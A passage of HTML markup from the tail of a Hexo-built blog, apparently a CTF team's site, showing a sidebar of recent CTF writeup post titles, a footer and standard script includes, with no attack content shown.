href="/archives/1970/01/">January 1970</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/11/24/2020-Taihuctf-writeup/">2020-Taihuctf-writeup</a>
          </li>
        
          <li>
            <a href="/2019/07/30/2019-googlectf-writeup-part2/">2019-googlectf-writeup-part2</a>
          </li>
        
          <li>
            <a href="/2019/07/30/2019-googlectf-writeup-part1/">2019-googlectf-writeup-part1</a>
          </li>
        
          <li>
            <a href="/2019/04/22/Asuri_2019/">2019 第十二届全国大学生信息安全竞赛—创新实践能力赛线上赛-Asuri 2019 wp</a>
          </li>
        
          <li>
            <a href="/2019/04/10/PHP%E5%A4%8D%E6%9D%82%E5%8F%98%E9%87%8F/">从一道题讲PHP复杂变量</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2023 All Members<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
      <a href="https://beian.miit.gov.cn/" target="_blank">鲁ICP备15035817号-2</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/members" class="mobile-nav-link">Members</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>


    
  </div>

</body>

</html>